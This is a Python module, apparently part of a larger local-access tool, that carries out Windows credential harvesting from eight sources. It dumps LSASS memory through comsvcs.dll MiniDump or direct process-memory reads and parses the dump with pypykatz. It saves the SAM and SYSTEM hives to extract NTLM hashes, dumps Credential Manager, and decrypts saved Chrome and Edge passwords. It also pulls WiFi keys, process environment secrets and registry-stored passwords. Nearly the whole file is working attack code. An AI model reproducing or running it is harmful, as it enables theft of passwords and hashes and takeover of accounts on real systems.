"""
Credential extraction for T's local access module.
All 8 sources: LSASS, SAM, Credential Manager, Browsers, WiFi,
Environment Variables, Scheduled Tasks, Registry.

Runs inside helper.py (elevated). Returns structured text results.
All temp files use safety.temp_path() and are cleaned up by session.kill().
"""

import asyncio
import os
import re
import sqlite3
import subprocess
import sys
import tempfile
from pathlib import Path

from .safety import temp_path, encrypt_data, decrypt_data

# ─── PowerShell helper ────────────────────────────────────────────────────────

def _ps_sync(cmd: str, timeout: int = 20) -> str:
    """Run a PowerShell command synchronously (helper runs sync). Return output."""
    try:
        result = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", cmd],
            capture_output=True, text=True, timeout=timeout,
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
        )
        out = result.stdout.strip()
        return out or result.stderr.strip() or "[no output]"
    except subprocess.TimeoutExpired:
        return f"[TIMEOUT] Exceeded {timeout}s"
    except Exception as e:
        return f"[ERROR] {e}"


# ─── 1. LSASS ─────────────────────────────────────────────────────────────────

def dump_lsass(session_key: bytes) -> dict:
    """
    Read LSASS process memory to extract cached credentials.
    Primary method: comsvcs.dll MiniDump via rundll32.
    Fallback: NtReadVirtualMemory via ctypes.
    Returns {method, raw_path, data, hashes, error}.
    Temp dump file is encrypted and path is returned for cleanup.
    """
    result = {"method": None, "raw_path": None, "data": "", "hashes": [], "error": None}

    if sys.platform != "win32":
        result["error"] = "LSASS dump requires Windows"
        return result

    # Find LSASS PID
    pid_out = _ps_sync("Get-Process lsass | Select-Object -ExpandProperty Id")
    pids    = re.findall(r'\d+', pid_out)
    if not pids:
        result["error"] = "Could not find LSASS PID"
        return result
    lsass_pid = pids[0]

    # Primary: comsvcs.dll MiniDump
    dump_file = temp_path(".dmp")
    try:
        cmd = (
            f'$p = Get-Process -Id {lsass_pid}; '
            f'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump '
            f'{lsass_pid} "{dump_file}" full; '
            f'Write-Output "done"'
        )
        out = _ps_sync(cmd, timeout=30)
        if dump_file.exists() and dump_file.stat().st_size > 1000:
            result["method"]   = "comsvcs_minidump"
            result["raw_path"] = str(dump_file)
            result["data"]     = _parse_minidump(str(dump_file), session_key)
            result["hashes"]   = _extract_ntlm_from_dump_data(result["data"])
            return result
    except Exception as e:
        pass   # try fallback

    # Fallback: NtReadVirtualMemory via ctypes
    try:
        data = _ntreadvm_lsass(int(lsass_pid))
        if data:
            result["method"] = "ntreadvm_fallback"
            result["data"]   = _scan_memory_for_creds(data)
            result["hashes"] = _extract_ntlm_from_dump_data(result["data"])
            return result
    except Exception as e:
        result["error"] = f"Both methods failed: {e}"

    return result


def _parse_minidump(dump_path: str, session_key: bytes) -> str:
    """Parse a MiniDump file with pypykatz. Returns formatted credential output."""
    try:
        from pypykatz.pypykatz import pypykatz  # type: ignore
        mimi  = pypykatz.parse_minidump_file(dump_path)
        lines = []
        for luid, session in mimi.logon_sessions.items():
            for cred in (
                session.msv_creds + session.wdigest_creds +
                session.kerberos_creds + session.credman_creds
            ):
                username = getattr(cred, "username", "") or ""
                password = getattr(cred, "password", "") or ""
                domain   = getattr(cred, "domainname", "") or ""
                ntlm     = getattr(cred, "NThash", b"") or b""
                if username or password:
                    line = f"  [{session.authentication_id}] {domain}\\{username}"
                    if password:
                        line += f" : {password}"
                    if ntlm:
                        line += f" (NTLM: {ntlm.hex()})"
                    lines.append(line)
        return "\n".join(lines) if lines else "  No credentials found in dump"
    except ImportError:
        return "  pypykatz not installed — install: pip install pypykatz"
    except Exception as e:
        return f"  Parse error: {e}"


def _ntreadvm_lsass(pid: int) -> bytes | None:
    """Read LSASS memory via NtReadVirtualMemory (ctypes). Returns raw bytes."""
    import ctypes
    import ctypes.wintypes as wt

    PROCESS_VM_READ           = 0x0010
    PROCESS_QUERY_INFORMATION = 0x0400

    kernel32 = ctypes.windll.kernel32
    ntdll    = ctypes.windll.ntdll

    h = kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
    if not h:
        return None

    try:
        buf  = ctypes.create_string_buffer(4096 * 1024)  # 4 MB chunk
        read = ctypes.c_size_t(0)
        base = 0
        chunks = []

        class _MEMORY_BASIC_INFORMATION(ctypes.Structure):
            _fields_ = [
                ("BaseAddress",       ctypes.c_void_p),
                ("AllocationBase",    ctypes.c_void_p),
                ("AllocationProtect", wt.DWORD),
                ("RegionSize",        ctypes.c_size_t),
                ("State",             wt.DWORD),
                ("Protect",           wt.DWORD),
                ("Type",              wt.DWORD),
            ]

        mbi   = _MEMORY_BASIC_INFORMATION()
        MEM_COMMIT = 0x1000
        PAGE_GUARD = 0x100

        while base < 0x7FFFFFFFFFFF:
            ret = kernel32.VirtualQueryEx(h, ctypes.c_void_p(base), ctypes.byref(mbi), ctypes.sizeof(mbi))
            if not ret:
                break
            if (
                mbi.State == MEM_COMMIT and
                mbi.Protect and
                not (mbi.Protect & PAGE_GUARD) and
                mbi.RegionSize < 32 * 1024 * 1024
            ):
                chunk_buf = ctypes.create_string_buffer(mbi.RegionSize)
                if kernel32.ReadProcessMemory(h, ctypes.c_void_p(base), chunk_buf, mbi.RegionSize, ctypes.byref(read)):
                    chunks.append(bytes(chunk_buf[:read.value]))

            base += mbi.RegionSize or 4096
            if len(chunks) > 500:   # cap at ~16 GB read — safety limit
                break

        return b"".join(chunks)
    finally:
        kernel32.CloseHandle(h)


def _scan_memory_for_creds(data: bytes) -> str:
    """Scan raw memory bytes for credential-like strings."""
    hits = set()
    for m in re.finditer(rb"(?:password|passwd|pwd)\x00{0,4}([\x20-\x7e]{6,64})", data, re.IGNORECASE):
        hits.add(m.group(1).decode("ascii", errors="replace"))
    return "\n".join(f"  {h}" for h in sorted(hits)) or "  No plaintext credentials found in memory scan"


def _extract_ntlm_from_dump_data(text: str) -> list[str]:
    return re.findall(r'[0-9a-f]{32}', text.lower())


# ─── 2. SAM database ─────────────────────────────────────────────────────────

def extract_sam(session_key: bytes) -> dict:
    """
    Extract local account NTLM hashes from SAM + SYSTEM hive.
    Returns {data, hashes, error}.
    """
    result: dict = {"data": "", "hashes": [], "error": None}

    if sys.platform != "win32":
        result["error"] = "SAM extraction requires Windows"
        return result

    sam_path = temp_path("_SAM")
    sys_path = temp_path("_SYSTEM")

    try:
        out_sam = _ps_sync(f'reg save HKLM\\SAM "{sam_path}" /y')
        out_sys = _ps_sync(f'reg save HKLM\\SYSTEM "{sys_path}" /y')

        if not sam_path.exists() or not sys_path.exists():
            result["error"] = f"reg save failed: {out_sam} | {out_sys}"
            return result

        try:
            from impacket.examples.secretsdump import LocalOperations, SAMHashes  # type: ignore
            ops    = LocalOperations(str(sys_path))
            boot   = ops.getBootKey()
            sam    = SAMHashes(str(sam_path), boot, isRemote=False)
            lines  = []
            hashes = []
            sam.dump()
            for line in sam.__dict__.get("_SAMHashes__items", []):
                s     = str(line)
                lines.append(f"  {s}")
                m = re.search(r':([0-9a-f]{32})$', s, re.IGNORECASE)
                if m:
                    hashes.append(m.group(1))
            result["data"]   = "\n".join(lines) or "  No local accounts found"
            result["hashes"] = hashes
        except ImportError:
            # Fallback: PowerShell-only SAM read (limited, no hash decryption)
            out = _ps_sync(
                "Get-ItemProperty 'HKLM:\\SAM\\SAM\\Domains\\Account\\Users\\*' "
                "| Select-Object PSChildName | Out-String"
            )
            result["data"]  = f"  impacket not installed — raw SAM keys:\n{out}"
        finally:
            for p in (sam_path, sys_path):
                try:
                    p.unlink(missing_ok=True)
                except Exception:
                    pass

    except Exception as e:
        result["error"] = str(e)

    return result


# ─── 3. Credential Manager ───────────────────────────────────────────────────

def dump_credential_manager() -> str:
    """Extract Windows Credential Manager entries."""
    out = _ps_sync(
        "[void][Windows.Security.Credentials.PasswordVault, Windows.Security.Credentials, "
        "ContentType=WindowsRuntime]; "
        "$vault = New-Object Windows.Security.Credentials.PasswordVault; "
        "try { $vault.RetrieveAll() | ForEach-Object { "
        "$_.RetrievePassword(); "
        "Write-Output \"Resource: $($_.Resource)\\nUsername: $($_.UserName)\\nPassword: $($_.Password)\\n---\" "
        "} } catch { 'Access denied or vault empty' }"
    )
    if not out or "Access denied" in out:
        # Fallback: cmdkey /list
        out = _ps_sync("cmdkey /list")
    return out or "  No credentials found in Credential Manager"


# ─── 4. Browser credentials ──────────────────────────────────────────────────

def extract_browser_creds() -> str:
    """Extract saved passwords from Chrome, Edge, and Firefox via DPAPI."""
    results = []

    for browser, profile_path, login_db_rel in [
        ("Chrome", Path.home() / "AppData/Local/Google/Chrome/User Data/Default",  "Login Data"),
        ("Edge",   Path.home() / "AppData/Local/Microsoft/Edge/User Data/Default",  "Login Data"),
    ]:
        login_db = profile_path / login_db_rel
        if not login_db.exists():
            continue

        # Copy DB (Chrome locks it while running)
        tmp = temp_path(".db")
        try:
            import shutil
            shutil.copy2(str(login_db), str(tmp))
            rows = _read_chrome_db(str(tmp), str(profile_path / "Local State"))
            if rows:
                results.append(f"\n  ── {browser} ──")
                for url, user, pwd in rows:
                    results.append(f"  URL  : {url}")
                    results.append(f"  User : {user}")
                    results.append(f"  Pass : {pwd}")
                    results.append("  ---")
        except Exception as e:
            results.append(f"  {browser} error: {e}")
        finally:
            try:
                tmp.unlink(missing_ok=True)
            except Exception:
                pass

    # Firefox
    ff_profiles = Path.home() / "AppData/Roaming/Mozilla/Firefox/Profiles"
    if ff_profiles.exists():
        results.append("\n  ── Firefox ──")
        results.append(_extract_firefox(ff_profiles))

    return "\n".join(results) if results else "  No browser credential files found"


def _read_chrome_db(db_path: str, local_state_path: str) -> list[tuple]:
    """Read Chrome/Edge Login Data SQLite DB and decrypt passwords via DPAPI."""
    rows = []
    try:
        # Get encryption key from Local State
        import json
        import base64
        enc_key = None
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                ls    = json.load(f)
                key64 = ls["os_crypt"]["encrypted_key"]
                enc_key_blob = base64.b64decode(key64)[5:]   # strip DPAPI prefix
                enc_key = _dpapi_decrypt(enc_key_blob)
        except Exception:
            pass

        conn   = sqlite3.connect(db_path)
        cursor = conn.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, user, enc_pass in cursor.fetchall():
            pwd = _decrypt_chrome_password(enc_pass, enc_key)
            rows.append((url, user, pwd))
        conn.close()
    except Exception as e:
        rows.append((f"[DB error: {e}]", "", ""))
    return rows


def _decrypt_chrome_password(enc_pass: bytes, aes_key: bytes | None) -> str:
    """Decrypt a Chrome password blob (v10/v20 AES-GCM or legacy DPAPI)."""
    if not enc_pass:
        return ""
    try:
        if enc_pass[:3] in (b"v10", b"v20") and aes_key:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            nonce = enc_pass[3:15]
            ct    = enc_pass[15:]
            return AESGCM(aes_key).decrypt(nonce, ct, None).decode("utf-8", errors="replace")
        else:
            # Legacy: DPAPI
            return _dpapi_decrypt(enc_pass).decode("utf-8", errors="replace")
    except Exception:
        return "[encrypted]"


def _dpapi_decrypt(ciphertext: bytes) -> bytes:
    """Decrypt a DPAPI-protected blob using the current user's credentials."""
    if sys.platform != "win32":
        return ciphertext
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

    p_in   = DATA_BLOB(len(ciphertext), ctypes.cast(ctypes.c_char_p(ciphertext), ctypes.POINTER(ctypes.c_char)))
    p_out  = DATA_BLOB()
    result = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(p_in), None, None, None, None, 0, ctypes.byref(p_out)
    )
    if result:
        return ctypes.string_at(p_out.pbData, p_out.cbData)
    return b""


def _extract_firefox(profiles_dir: Path) -> str:
    """Extract Firefox credentials using PowerShell (no NSS dependency)."""
    lines = []
    try:
        for profile in profiles_dir.iterdir():
            logins = profile / "logins.json"
            if logins.exists():
                import json
                with open(logins, "r", encoding="utf-8") as f:
                    data = json.load(f)
                for entry in data.get("logins", []):
                    lines.append(f"  URL      : {entry.get('hostname', '')}")
                    lines.append(f"  Username : {entry.get('encryptedUsername', '[encrypted]')}")
                    lines.append(f"  Password : [Firefox master password required to decrypt]")
                    lines.append("  ---")
    except Exception as e:
        lines.append(f"  Firefox read error: {e}")
    return "\n".join(lines) if lines else "  No Firefox profiles found"


# ─── 5. WiFi passwords ───────────────────────────────────────────────────────

def extract_wifi() -> str:
    """Extract saved WiFi network passwords via netsh."""
    profiles_out = _ps_sync("netsh wlan show profiles | Select-String 'All User Profile' | "
                            "ForEach-Object { ($_ -split ':')[1].Trim() }")
    ssids = [s.strip() for s in profiles_out.splitlines() if s.strip()]
    if not ssids:
        return "  No saved WiFi profiles found"

    lines = []
    for ssid in ssids:
        safe = ssid.replace('"', '')
        out  = _ps_sync(f'netsh wlan show profile name="{safe}" key=clear')
        key  = re.search(r'Key Content\s*:\s*(.+)', out)
        pwd  = key.group(1).strip() if key else "[no password / open network]"
        lines.append(f"  {ssid:30s} : {pwd}")

    return "\n".join(lines)


# ─── 6. Environment variables ────────────────────────────────────────────────

def scan_env_vars() -> str:
    """
    Scan environment variables of all running processes for credential patterns.
    Requires admin to read other processes' environments.
    """
    patterns = re.compile(
        r'(API[_-]?KEY|SECRET[_-]?KEY|ACCESS[_-]?TOKEN|AUTH[_-]?TOKEN|'
        r'PASSWORD|PASSWD|DB[_-]?PASS|DB[_-]?PASSWORD|'
        r'GITHUB[_-]?TOKEN|AWS[_-]?SECRET|STRIPE[_-]?KEY)',
        re.IGNORECASE,
    )

    cmd = (
        "Get-Process | ForEach-Object { "
        "try { "
        "  $proc = $_; "
        "  $env = [System.Diagnostics.Process]::GetProcessById($proc.Id).StartInfo.EnvironmentVariables; "
        "  if ($env) { "
        "    $env.Keys | ForEach-Object { "
        "      $k = $_; $v = $env[$k]; "
        "      if ($k -match 'KEY|TOKEN|SECRET|PASSWORD|PASSWD') { "
        "        Write-Output \"[$($proc.ProcessName)] $k = $v\" "
        "      } "
        "    } "
        "  } "
        "} catch {} } | Select-Object -First 50"
    )
    out = _ps_sync(cmd, timeout=30)
    filtered = [l for l in out.splitlines() if patterns.search(l)]
    return "\n".join(f"  {l}" for l in filtered) if filtered else "  No credential-like environment variables found"


# ─── 7. Scheduled tasks ──────────────────────────────────────────────────────

def inspect_scheduled_tasks() -> str:
    """List scheduled tasks that run as specific users or have embedded credentials."""
    out = _ps_sync(
        "Get-ScheduledTask | Where-Object { $_.Principal.UserId -and "
        "$_.Principal.UserId -notlike 'SYSTEM' -and "
        "$_.Principal.UserId -notlike 'NT AUTHORITY*' -and "
        "$_.Principal.UserId -notlike 'BUILTIN*' } | "
        "Select-Object TaskName, @{N='RunAs';E={$_.Principal.UserId}}, "
        "@{N='Action';E={($_.Actions | Select-Object -First 1).Execute}} | "
        "Format-Table -AutoSize | Out-String",
        timeout=20,
    )
    return out.strip() or "  No scheduled tasks with user credentials found"


# ─── 8. Registry credential paths ────────────────────────────────────────────

def scan_registry() -> str:
    """Query known registry paths that may store credentials."""
    paths = {
        "AutoLogon password":    r"HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
        "PuTTY sessions":        r"HKCU:\Software\SimonTatham\PuTTY\Sessions",
        "VNC (WinVNC3)":         r"HKCU:\Software\ORL\WinVNC3",
        "VNC (TightVNC)":        r"HKLM:\SOFTWARE\TightVNC\Server",
        "VNC (RealVNC)":         r"HKLM:\SOFTWARE\RealVNC\WinVNC4",
        "SNMP community string": r"HKLM:\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities",
    }

    lines = []
    for label, path in paths.items():
        out = _ps_sync(f"Get-ItemProperty -Path '{path}' -ErrorAction SilentlyContinue | Out-String")
        if out and len(out.strip()) > 10 and "cannot find path" not in out.lower():
            lines.append(f"  [{label}]")
            for line in out.strip().splitlines()[:5]:
                if line.strip():
                    lines.append(f"    {line.strip()}")

    return "\n".join(lines) if lines else "  No credentials found in registry paths"
